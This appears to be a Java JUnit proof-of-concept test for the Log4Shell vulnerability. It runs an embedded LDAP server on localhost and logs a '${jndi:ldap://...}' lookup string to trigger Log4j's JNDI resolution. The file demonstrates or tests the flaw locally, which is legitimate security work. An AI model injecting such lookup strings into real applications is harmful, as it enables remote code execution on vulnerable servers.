package poc.tonyd.log4j.ohmy;

import org.apache.directory.server.annotations.CreateLdapServer;
import org.apache.directory.server.annotations.CreateTransport;
import org.apache.directory.server.core.annotations.ApplyLdifFiles;
import org.apache.directory.server.core.annotations.CreateDS;
import org.apache.directory.server.core.annotations.CreatePartition;
import org.apache.directory.server.core.integ.AbstractLdapTestUnit;
import org.apache.directory.server.core.integ.FrameworkRunner;
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

@RunWith(FrameworkRunner.class)
@CreateLdapServer(allowAnonymousAccess = true, transports = { @CreateTransport(protocol = "LDAP", address = "localhost", port = 10389) })
@CreateDS(allowAnonAccess = true, partitions = { @CreatePartition(name = "ldap-connection-tool", suffix = "dc=baeldung,dc=com") })
@ApplyLdifFiles({ "ldap-connection-tool.ldif" })
public class Log4jExploitUnitTest extends AbstractLdapTestUnit {

	private static final Logger log = LogManager.getLogger(Log4jExploitUnitTest.class);
	
    @Before
    public void init() {
        System.setProperty("debug.mode", "true");
        System.clearProperty("url");
        System.clearProperty("user");
        System.clearProperty("password");
        System.clearProperty("query");
    }
    
	@Test
	public void testLoggerSubmissionToLdap() {
        System.setProperty("url", "ldap://localhost:10389");
        System.setProperty("user", "uid=gauss,dc=baeldung,dc=com");

        log.info("Start test");
		log.error("${jndi:ldap://127.0.0.1:10389/Exploit}");
		log.info("End test");
	}
	
}
